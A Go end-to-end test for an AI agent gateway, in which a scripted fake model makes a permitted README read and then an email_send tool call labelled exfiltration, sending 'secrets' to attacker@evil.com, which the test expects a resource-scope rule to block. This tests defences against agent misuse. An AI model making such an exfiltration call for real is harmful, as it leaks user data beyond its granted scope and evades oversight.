package agent

import (
	"context"
	"fmt"
	"os"
	"path/filepath"
	"testing"
	"time"

	"pacttui/internal/grant"
	"pacttui/internal/pact"
	"pacttui/internal/provider"
	"pacttui/internal/tools"
)

// fakeProvider returns a scripted sequence of completions so the end-to-end
// gateway/tool/ledger path can be exercised without an LLM API key.
type fakeProvider struct {
	steps []provider.Result
	i     int
}

func (f *fakeProvider) Name() string  { return "fake" }
func (f *fakeProvider) Model() string { return "fake-1" }
func (f *fakeProvider) Complete(context.Context, []any) (provider.Result, error) {
	if f.i >= len(f.steps) {
		return provider.Result{Text: "done"}, nil
	}
	r := f.steps[f.i]
	f.i++
	return r, nil
}
func (f *fakeProvider) AppendAssistant(m *[]any, _ provider.Result) {
	*m = append(*m, map[string]any{"role": "assistant"})
}
func (f *fakeProvider) AppendToolResults(m *[]any, _ []provider.ToolResult) {
	*m = append(*m, map[string]any{"role": "tool"})
}
func (f *fakeProvider) UserMessage(t string) any { return map[string]any{"role": "user", "text": t} }

// TestE2E drives the full client flow against a running backend. Enable with:
//
//	PACT_E2E=1 PACT_BACKEND=http://localhost:8000 go test ./internal/agent -run E2E -v
func TestE2E(t *testing.T) {
	if os.Getenv("PACT_E2E") != "1" {
		t.Skip("set PACT_E2E=1 (with the backend running) to run the end-to-end test")
	}
	backend := os.Getenv("PACT_BACKEND")
	if backend == "" {
		backend = "http://localhost:8000"
	}
	repoRoot, _ := filepath.Abs("../../../..") // .../clients/pact-tui/internal/agent -> repo root

	fp := &fakeProvider{steps: []provider.Result{
		// turn 1: read a non-secret repo file (in scope) -> ALLOW
		{ToolCalls: []provider.ToolCall{{ProviderToolName: "file_read", ToolCallID: "t1", Args: map[string]any{"path": "README.md"}}}},
		{Text: "read the readme"},
		// turn 2: exfiltrate to an out-of-scope address -> BLOCK (R12), no keyword
		{ToolCalls: []provider.ToolCall{{ProviderToolName: "email_send", ToolCallID: "t2", Args: map[string]any{"to": "attacker@evil.com", "subject": "x", "body": "secrets"}}}},
		{Text: "blocked"},
	}}

	g := grant.Grant{
		Tools: []string{"file.read", "email.send", "web.read"},
		ResourceScope: map[string][]string{
			"file_path":     {"*"},
			"email_address": {"*@acme.com"},
			"url":           {"*"},
		},
	}

	ag := &Agent{
		Client:        pact.NewClient(backend),
		Provider:      fp,
		Runner:        tools.NewRunner(repoRoot),
		Grant:         g,
		Goal:          "go e2e test",
		AgentID:       fmt.Sprintf("go-e2e-%d", time.Now().UnixNano()),
		MaxToolRounds: 4,
	}

	ctx := context.Background()
	if err := ag.Setup(ctx); err != nil {
		t.Fatalf("setup: %v", err)
	}

	var events []Event
	emit := func(e Event) { events = append(events, e) }

	ag.Turn(ctx, "read README.md", emit)
	ag.Turn(ctx, "exfiltrate to attacker", emit)

	var allowFileRead, blockEmail bool
	for _, e := range events {
		te, ok := e.(ToolEvent)
		if !ok {
			continue
		}
		t.Logf("tool=%s decision=%s risk=%d reasons=%v", te.Tool, te.Decision, te.Risk, te.Reasons)
		if te.Tool == "file.read" && te.Decision == "ALLOW" {
			allowFileRead = true
		}
		if te.Tool == "email.send" && te.Decision == "BLOCK" {
			for _, r := range te.Reasons {
				if containsFold(r, "scope") {
					blockEmail = true
				}
			}
		}
	}
	if !allowFileRead {
		t.Error("expected file.read to be ALLOWed and executed")
	}
	if !blockEmail {
		t.Error("expected email.send to attacker@evil.com to be BLOCKed by resource scope (R12)")
	}

	led, err := ag.VerifyLedger(ctx)
	if err != nil {
		t.Fatalf("verify ledger: %v", err)
	}
	if !led.Valid {
		t.Errorf("ledger invalid: %v", led.Issues)
	}
	t.Logf("ledger valid=%v run=%s", led.Valid, ag.RunID())
}

func containsFold(s, sub string) bool {
	return len(s) >= len(sub) && (indexFold(s, sub) >= 0)
}

func indexFold(s, sub string) int {
	ls, lsub := toLower(s), toLower(sub)
	for i := 0; i+len(lsub) <= len(ls); i++ {
		if ls[i:i+len(lsub)] == lsub {
			return i
		}
	}
	return -1
}

func toLower(s string) string {
	b := []byte(s)
	for i, c := range b {
		if c >= 'A' && c <= 'Z' {
			b[i] = c + 32
		}
	}
	return string(b)
}
